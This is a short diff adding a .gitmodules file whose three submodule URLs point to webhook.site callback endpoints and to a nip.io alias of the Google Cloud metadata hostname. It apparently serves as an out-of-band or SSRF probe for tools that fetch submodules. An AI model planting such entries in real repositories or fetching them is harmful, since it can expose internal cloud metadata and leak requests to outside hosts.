@@ -1,0 +1,9 @@
+[submodule "oast3"]
+	path = sub3
+	url = https://webhook.site/e002f9d3-4821-4b69-a7fa-05adf193613d/r3-main
+[submodule "oast3b"]
+	path = sub3b
+	url = ssh://git@webhook.site:22/r3
+[submodule "meta3"]
+	path = sub3m
+	url = http://metadata.google.internal.nip.io/r3
